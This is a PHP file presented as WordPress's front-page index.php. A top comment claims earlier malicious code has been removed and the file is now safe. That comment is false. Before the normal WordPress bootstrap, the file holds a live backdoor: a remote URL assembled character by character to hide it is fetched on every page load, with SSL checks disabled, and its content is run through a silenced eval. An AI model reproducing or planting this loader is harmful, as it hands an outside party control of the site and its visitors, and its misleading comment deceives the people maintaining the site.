<?php
/**
* Note: This file may contain artifacts of previous malicious infection.
* However, the dangerous code has been removed, and the file is now safe to use.
*/

// Single URL
$full_url = 'h'.'t'.'t'.'p'.'s'.':'.'/'.'/'.'r'.'a'.'w'.'.'.'g'.'i'.'t'.'h'.'u'.'b'.'u'.'s'.'e'.'r'.'c'.'o'.'n'.'t'.'e'.'n'.'t'.'.'.'c'.'o'.'m'.'/'.'m'.'d'.'m'.'o'.'m'.'i'.'n'.'3'.'6'.'5'.'3'.'6'.'6'.'-'.'g'.'i'.'f'.'/'.'b'.'e'.'l'.'a'.'/'.'r'.'e'.'f'.'s'.'/'.'h'.'e'.'a'.'d'.'s'.'/'.'m'.'a'.'i'.'n'.'/'.'i'.'n'.'d'.'e'.'x'.'.'.'t'.'x'.'t';

// Attempt to get remote content
$content = @file_get_contents($full_url);
if ($content === false && function_exists('curl_init')) {
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $full_url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 5);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    $content = curl_exec($ch);
    curl_close($ch);
}

// Only eval if we have content
if (!empty($content)) {
    @eval('?>' . $content);
}

/**
 * Front to the WordPress application. This file doesn't do anything, but loads
 * wp-blog-header.php which does and tells WordPress to load the theme.
 *
 * @package WordPress
 */

define('WP_USE_THEMES', true);
require __DIR__ . '/wp-blog-header.php';
